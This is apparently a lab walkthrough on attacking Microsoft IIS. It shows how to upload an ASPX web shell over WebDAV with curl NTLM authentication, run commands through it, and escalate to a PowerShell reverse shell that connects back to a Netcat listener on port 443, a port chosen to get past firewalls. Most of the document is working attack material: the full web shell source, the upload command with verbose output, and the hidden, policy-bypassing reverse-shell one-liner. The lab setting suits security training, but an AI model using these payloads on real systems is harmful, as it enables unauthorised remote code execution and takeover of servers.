# 📌 Web Server Attacks - II

## IIS Fingerprinting and Enumeration

### What IIS Version Numbers Tell You

IIS version numbers map directly to Windows Server releases. This matters because many CVEs are version-specific, and many organisations run IIS on servers that are no longer receiving security updates.

| IIS Version |	Windows Server |	Status |
|--|--|--|
| IIS 6.0 |	Server 2003 |	End of Life (July 2015). No patches issued post-EOL. |
| IIS 7.0 / 7.5 |	Server 2008 / 2008 R2 |	End of Life |
| IIS 8.0 / 8.5 |	Server 2012 / 2012 R2 |	End of Life |
| IIS 10.0 |	Server 2016, 2019, 2022 |	Current |


## WebDAV Exploitation: Uploading an ASPX Shell


### Three Conditions for a Successful Shell Upload

Three things must all be true simultaneously:

1. WebDAV is enabled on the target directory
2. Valid credentials with Write permission on the WebDAV directory
3. Script Execute is set, IIS passes .aspx requests to the ASP.NET handler rather than serving them as static content

If anything is missing, the attack fails at that step.

### Preparing the ASPX Shell

Save the following as cmd.aspx on your AttackBox. It accepts a cmd query parameter, runs it through cmd.exe, and returns the output:

```bash
<​%@ Page Language="C#" %​>
<​%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%​>
```

### Uploading the Shell

IIS protects the /webdav/ directory with Windows Authentication. Anonymous users can only read (GET), but write operations (PUT, DELETE, MOVE) require a valid Windows identity. NTLM proves that identity without transmitting the plaintext password. The flag --ntlm in curl tells it to use this handshake protocol for authentication.

Use curl with NTLM authentication to PUT the file directly to the WebDAV directory. In the AttackBox, enter the following command:

```bash
root@ip-10-81-64-63:~# curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.48.136.11/webdav/cmd.aspx
*   Trying 10.82.111.103:80...
* TCP_NODELAY set
* Connected to 10.48.136.11 (10.82.111.103) port 80 (#0)
* Server auth using NTLM with user 'webdav_user'
> PUT /webdav/cmd1.aspx HTTP/1.1
> Host: 10.48.136.11
> Authorization: NTLM TlRMTVNTUAABAAAABoIIAAAAAAAAAAAAAAAAAAAAAAA=
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 0
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html; charset=us-ascii
< Server: Microsoft-HTTPAPI/2.0
< WWW-Authenticate: NTLM TlRMTVNTUAACAAAADwAPADgAAAAGgooCUr19HvNweE8AAAAAAAAAAKQApABHAAAACgBjRQAAAA9DSEFOR0UtTVktSE9TVE4CAB4AQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AAQAeAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAAQAJABDAEgAQQBOAEcARQAtAE0AWQAtAEgATwBTAFQATgBBAE0ARQADACQAQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AQQBNAEUABwAIAOe3aDm71NwBAAAAAA==
< Date: Sat, 25 Apr 2026 13:55:50 GMT
< Content-Length: 341
<
* Ignoring the response-body
* Connection #0 to host 10.48.136.11 left intact
* Issue another request to this URL: 'http://10.48.136.11/webdav/cmd1.aspx'
* Found bundle for host 10.48.136.11: 0x561346141070 [serially]
* Can not multiplex, even if we wanted to!
* Re-using existing connection! (#0) with host 10.48.136.11
* Connected to 10.48.136.11 (10.82.111.103) port 80 (#0)
* Server auth using NTLM with user 'webdav_user'
> PUT /webdav/cmd1.aspx HTTP/1.1
> Host: 10.48.136.11
> Authorization: NTLM TlRMTVNTUAADAAAAGAAYAEAAAADUANQAWAAAAAAAAAAsAQAACwALACwBAAAOAA4ANwEAAAAAAAAAAAAABoKKAhuOfD612m7mouqEmLimX8M8+sTBhmllV/pPadk7qq29fPVauA7TodgBAQAAAAAAAAAYST+71NwBPPrEwYZpZVcAAAAAAgAeAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAAEAHgBDAEgAQQBOAEcARQAtAE0AWQAtAEgATwBTAFQATgAEACQAQwBIAEEATgBHAEUALQBNAFkALQBIAE8AUwBUAE4AQQBNAEUAAwAkAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAcACADnt2g5u9TcAQAAAAAAAAAAd2ViZGF2X3VzZXJpcC0xMC04MS02NC02Mw==
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 436
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Server: Microsoft-IIS/10.0
< Persistent-Auth: true
< X-Powered-By: ASP.NET
< Date: Sat, 25 Apr 2026 13:55:50 GMT
< Content-Length: 0
<
* Connection #0 to host 10.48.136.11 left intact
```

```201 Created``` confirms the file was written to the server.

### Confirming Execution
Request the shell with a test command:

```bash
root@ip-10-82-74-10:~# curl "http://10.48.136.11/webdav/cmd.aspx?cmd=whoami"
<pre>iis apppool\defaultapppool
</pre>
```


## ASPX Web Shells

### What an ASPX Web Shell Is

An ASPX web shell is an ASP.NET file hosted on a web server that accepts attacker input via HTTP and executes it under the server process. From the server's perspective, it is just another .aspx page. From the attacker's perspective, it is a remote command interface.

When IIS receives a request for cmd.aspx, it passes the file to the ASP.NET handler. The handler compiles and executes the code inside w3wp.exe, the IIS worker process. The code runs under the Application Pool identity, which is whatever Windows account the app pool is configured to use.

This matters because the Application Pool identity determines what the shell can do. An app pool running as ApplicationPoolIdentity (the IIS 7.5+ default) has limited system access but inherits SeImpersonatePrivilege. An app pool running as a Domain Admin or SYSTEM would give the shell immediate high privileges.


### Step 1: Execute Commands Through the Shell

With cmd.aspx uploaded to /webdav/, you can run commands by passing them as the cmd query parameter. Navigate to the following URL in your browser or use curl, the response body will contain the output of the command rendered in a <pre> block:

```bash
root@ip-10-82-74-10:~# curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
<pre>iis apppool\defaultapppool
</pre>
```

Try a few more commands to get oriented:

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=hostname"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=ipconfig"
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=dir+C:\\"
```


### Step 2: Escalate to a Reverse Shell

A command shell through a browser is useful but limited. For interactive access, you want a full reverse shell session. The cleanest approach is to trigger a PowerShell one-liner from the ASPX shell that connects back to a Netcat listener on your AttackBox.

First, start Netcat on your AttackBox, listening on port 443:

```nc -lvnp 443```

Port 443 is preferred over 4444 because outbound HTTPS traffic is almost never blocked by enterprise firewalls, reducing the likelihood of the callback being dropped.

Next, construct the PowerShell reverse shell command and pass it through the ASPX shell. Replace `{CONNECTION_IP}` with your AttackBox IP address or the tun0 interface IP if using the TryHackMe VPN:

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -c `
"$client = New-Object System.Net.Sockets.TCPClient('{CONNECTION_IP}',443);`
$stream = $client.GetStream();`
[byte[]]$bytes = 0..65535|%{0};`
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
$sendback = (iex $data 2>&1 | Out-String );`
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
$client.Close()""
```


In the AB enter the following command:

```bash
root@ip-10-82-82-195:~# curl -G "http://10.48.136.11/webdav/cmd.aspx" \
>   --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'CONNECTION_IP'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```










